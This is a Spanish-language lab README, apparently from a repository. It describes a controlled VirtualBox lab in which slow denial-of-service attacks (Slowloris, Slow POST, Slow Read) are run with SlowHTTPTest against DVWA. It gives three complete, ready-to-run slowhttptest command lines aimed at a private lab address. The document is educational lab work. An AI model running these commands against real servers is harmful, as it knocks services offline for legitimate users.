# Prueba DoS usando SlowHTTPTest

Este proyecto documenta la creación de un laboratorio controlado para estudiar **ataques de denegación de servicio (DoS)** de tipo *slow* sobre una aplicación web vulnerable (**DVWA**) utilizando la herramienta **SlowHTTPTest**.  

**Aviso**: Todo el contenido de este repositorio tiene fines exclusivamente educativos y de aprendizaje. **No debe aplicarse en entornos de producción ni contra sistemas ajenos sin autorización.**

---

## Introducción

Un ataque de **denegación de servicio (DoS)** busca saturar los recursos de un sistema (servidor, red, aplicación) para impedir el acceso a usuarios legítimos.  
La versión distribuida, conocida como **DDoS**, utiliza múltiples equipos (ej. botnets) para lanzar el ataque de forma coordinada, aumentando su impacto.  

En este laboratorio hemos simulado ataques *slow*:
- **Slowloris (Slow Headers)**  
- **Slow POST**  
- **Slow Read**

El objetivo es entender cómo afectan al servidor y qué medidas de prevención pueden aplicarse.

---

## Entorno del laboratorio

- **VirtualBox** como herramienta de virtualización.
- **Máquina víctima**: DVWA (Damn Vulnerable Web Application).  
  - Red: Host-Only (aislado del exterior).  
  - 1-2 GB RAM, 10-15 GB disco.
- **Máquina atacante**: Kali Linux.  
  - Red: Host-Only + NAT (para actualizaciones).  
  - 2-4 GB RAM, 20-40 GB disco.  

### Descargas
- DVWA: [VulnHub](https://www.vulnhub.com/entry/damn-vulnerable-web-application-dvwa-107,43/)  
- Kali Linux: [kali.org](https://www.kali.org/get-kali/#kali-virtual-machines)  

Ambas imágenes fueron verificadas mediante sus **hashes (MD5/SHA256)** para garantizar su integridad.

---

## Instalación de SlowHTTPTest

En la máquina Kali:  
```bash
sudo apt update
sudo apt install -y slowhttptest
```

## Ejecución de ataques

Los ataques se realizaron sobre la URL:
http://192.168.56.102/login.php


1. Slowloris (Slow Headers)
```bash
slowhttptest -c 500 -H -g -o slowloris_test -i 20 -r 100 -t GET -u http://192.168.56.102/login.php
```

2. Slow POST
```bash
slowhttptest -c 400 -g -o slowpost_test -i 20 -r 80 -t POST -u http://192.168.56.102/login.php -x 24 -p 5
```

3. Slow Read
```bash
slowhttptest -c 400 -R -g -o slowread_test -i 20 -r 80 -t GET -u http://192.168.56.102/login.php
```


## Documentación completa

El informe detallado en PDF está disponible en este archivo: [`DoS_SlowHTTPTest.pdf`](./docs/DoS_SlowHTTPTest.pdf)
